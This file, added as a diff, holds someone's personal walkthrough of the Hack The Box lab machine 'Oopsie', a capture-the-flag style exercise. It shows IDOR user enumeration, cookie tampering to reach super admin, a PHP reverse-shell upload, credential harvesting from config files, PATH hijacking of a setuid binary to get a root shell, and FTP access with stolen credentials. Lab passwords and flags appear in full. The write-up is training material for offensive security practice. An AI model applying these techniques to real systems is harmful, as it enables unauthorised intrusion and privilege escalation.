@@ -1,0 +1,232 @@
+nmap scan shows 22 and 80
+
+Web server running - Apache/2.4.29
+
+Went to the web server
+Found an email - admin@megacorp.com
+
+Found a login page with dirbuster - cdn-cgi/login/index.php
+Also found:
+- uploads - empty directoyr
+- db.php - empty page
+- admin.php - redirect to login page
+Tried brute forcing with some common default credentials
+
+Used the password from the previous box (Archetype) to fill in the password (MEGACORP_4dm1n!!) and the username (admin), which worked
+
+Found this page - cdn-cgi/login/admin.php?content=accounts&id=1
+Ran intruder with number sequences and found the following users.
+
+34322	admin	admin@megacorp.com
+8832	john	john@tafcz.co.uk
+57633	Peter	peter@qpic.co.uk
+28832	Rafol	tom@rafol.co.uk
+86575	super admin	superadmin@megacorp.com
+
+
+Went to uploads (This action requires super admin rights)
+
+GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
+Host: 10.10.10.28
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: user=34322; role=admin
+Connection: close
+
+
+changed user to 86575 and role to super admin which let me render the page
+
+Setup burp auto regex replace to set the cookie in all requests
+
+
+
+
+
+Found php reverse shell, named it test.php and uploaded it.
+Then visiting 'uploads/test.php' (found using dirbuster) I was able to get a shell
+
+cat /home/robert/user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+
+
+
+
+upgrade to tty(ish)
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+www-data@oopsie:/$ locate db.php
+locate db.php
+/var/www/html/cdn-cgi/login/db.php
+
+www-data@oopsie:/$ cat /var/www/html/cdn-cgi/login/db.php
+cat /var/www/html/cdn-cgi/login/db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+su robert
+
+robert@oopsie:/$ id
+id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+
+
+shows robert is part of the bugtracker group
+
+robert@oopsie:/$ find / -type f -group bugtracker 2>/dev/null
+find / -type f -group bugtracker 2>/dev/null
+/usr/bin/bugtracker
+
+
+found the bugtracker binary
+
+
+
+
+robert@oopsie:/usr/bin$ bugtracker
+bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 2
+2
+---------------
+
+If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.
+
+ProblemType: Bug
+DistroRelease: Ubuntu 16.10
+Package: filezilla 3.15.0.2-1ubuntu1
+Uname: Linux 4.5.0-040500rc7-generic x86_64
+ApportVersion: 2.20.1-0ubuntu3
+Architecture: amd64
+CurrentDesktop: Unity
+Date: Sat May 7 16:58:57 2016
+EcryptfsInUse: Yes
+SourcePackage: filezilla
+UpgradeStatus: No upgrade log present (probably fresh install)
+
+
+
+
+
+using the strings command shows this:
+robert@oopsie:/usr/bin$ strings /usr/bin/bugtracker
+strings /usr/bin/bugtracker
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+strcpy
+__isoc99_scanf
+__stack_chk_fail
+putchar
+printf
+strlen
+malloc
+strcat
+system
+geteuid
+__cxa_finalize
+__libc_start_main
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+AWAVI
+AUATL
+[]A\A]A^A_
+------------------
+: EV Bug Tracker :
+------------------
+Provide Bug ID:
+---------------
+cat /root/reports/
+
+
+
+It calls the cat command, we can overwrite this by adding a malicious cat binary to the path
+
+robert@oopsie:~$ export PATH=/home/robert:$PATH
+export PATH=/home/robert:$PATH
+robert@oopsie:~$ echo '/bin/sh' > cat
+echo '/bin/sh' > cat
+robert@oopsie:~$ chmod +x cat
+chmod +x cat
+
+
+This should give us a root shell
+
+
+Fixed cat
+
+root@oopsie:/root/.config/filezilla# cat /root/.config/filezilla/filezilla.xml
+<ilezilla# cat /root/.config/filezilla/filezilla.xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<FileZilla3>
+    <RecentServers>
+        <Server>
+            <Host>10.10.10.46</Host>
+            <Port>21</Port>
+            <Protocol>0</Protocol>
+            <Type>0</Type>
+            <User>ftpuser</User>
+            <Pass>mc@F1l3ZilL4</Pass>
+            <Logontype>1</Logontype>
+            <TimezoneOffset>0</TimezoneOffset>
+            <PasvMode>MODE_DEFAULT</PasvMode>
+            <MaximumMultipleConnections>0</MaximumMultipleConnections>
+            <EncodingType>Auto</EncodingType>
+            <BypassProxy>0</BypassProxy>
+        </Server>
+    </RecentServers>
+</FileZilla3>
+
+We can see:
+user - ftpuser
+pass - mc@F1l3ZilL4
+
+
+
+root@oopsie:/root/.config/filezilla# cat /root/root.txt
+cat /root/root.txt
+af13b0bee69f8a877c3faf667f7beacf
+
+
+
+Extra
+
+kali@kali:~/workspace/hackthebox/archetype$ ftp 10.10.10.46
+Connected to 10.10.10.46.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.46:kali): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
+226 Directory send OK.
+ftp> get backup.zip
+local: backup.zip remote: backup.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for backup.zip (2533 bytes).
+226 Transfer complete.
+2533 bytes received in 0.02 secs (108.5355 kB/s)
+ftp> exit
+221 Goodbye.
+
+Received the backup of the website, requires password, can't find which one...
